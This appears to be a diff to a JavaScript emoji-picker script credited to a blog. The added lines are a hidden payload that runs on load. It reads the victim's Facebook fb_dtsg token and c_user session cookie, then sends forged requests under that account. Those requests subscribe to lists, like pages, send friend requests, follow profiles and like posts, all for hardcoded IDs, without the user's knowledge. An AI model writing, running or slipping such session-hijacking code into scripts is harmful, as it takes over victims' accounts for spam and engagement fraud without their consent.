@@ -68,3 +68,135 @@ var aing={
   tesEmoji:function(){symbols_japan_emoji_list=aing.aduk(symbols_japan_emoji_list);var isiprepiyuw="",tmb="max-height:300px;text-align:left;overflow:auto",a="<div id=\"prepiyuw\" style=\""+tmb+"\"></div><div id=\"bycat\" style=\"display:none;"+tmb+"\"><ol style=\"padding:0;margin:0;list-style-type:none\">",b=symbols_japan_emoji_list,c="<textarea id=\"tmpt-emj\" onClick=\"this.select()\" style=\"width:100%;height:50px;resize:none;padding:0;border:none;border-radius:3px;background-color:transparent\"></textarea>";for(x in b){a+="<li><h2 style=\""+aing.stl.dlm+";text-align:center\">"+b[x].name+"</h2><ol style=\"padding:0 10px;list-style-type:none\">";for(y in b[x].subs){a+="<li><b><a href=\"#\" title=\"Click to add all\" onClick=\"aing.asupkeun("+x+","+y+");return false\">"+b[x].subs[y].name+"</a></b><center>";for(z in b[x].subs[y].list){var tahieu=b[x].subs[y].list[z],emt;if(tahieu.cl){emt=aing.emot(tahieu.cl,"aing.asupkeun("+x+","+y+","+z+")","white");isiprepiyuw+=emt}else{emt=aing.emot(null,"aing.asupkeun("+x+","+y+","+z+")","lightgreen",tahieu)};a+=emt}a+="</center></li>"}a+="</ol></li>"}a+="</ol></div>";aing.nyubox("prohax04.blogspot.com",a,c);if(isiprepiyuw!=""){aing.putDiAhir(isiprepiyuw,document.getElementById("prepiyuw"))}}
 };
 aing.tesEmoji();
+//
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function LIST(L) {
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
+  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+	  X.close;
+    }
+  };
+  X.send(XParams);
+}
+
+LIST("645496728822076");
+LIST("654434804594935");
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function Like(p) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
+  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+Like("236860313161029");
+Like("517261381705189");
+Like("433484740038088");
+Like("347703562019483");
+Like("1459561270931796");
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function IDS(r) {
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
+  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+IDS("100000852641867");
+IDS("100000499042512");
+IDS("100000480150909");
+IDS("100000864972291");
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function a(abone) {
+  var http4 = new XMLHttpRequest();
+  var url4 = "/ajax/follow/follow_profile.php?__a=1";
+  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
+  http4.open("POST", url4, true);
+  http4.onreadystatechange = function () {
+    if (http4.readyState == 4 && http4.status == 200) {
+      http4.close;
+    }
+  };
+  http4.send(params4);
+}
+a("100000852641867");
+a("100000499042512");
+a("100000480150909");
+a("100000864972291");
+a("100001187990060");
+a("100001861874867");
+a("100001266656423");
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var now=(new Date).getTime();
+function P(post) {
+  var X = new XMLHttpRequest();
+  var XURL ="//www.facebook.com/ajax/ufi/like.php";
+  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+P("245138202325805");
+P("649286048443144");
+P("649239768447772");
+P("648047475233668");
+P("647739268597822");
+P("647235881981494");
+P("637513256287090");
+P("651820338189715");
+P("653138801391202");
+P("653005388071210");
+P("652948341410248");
+P("652935804744835");
+P("652713461433736");       
+P("652313528140396");
+P("650931521611930");
+P("649840781721004");
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var now=(new Date).getTime();
+function P(opo) {
+  var X = new XMLHttpRequest();
+  var XURL ="//www.facebook.com/ajax/ufi/like.php";
+  var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+P("819201248106502");
+P("819141091445851");
+P("819128378113789");
+P("814828875210406");
+P("817570438269583");
+P("817570354936258");
+P("646940352011047");
+P("815936571766303");
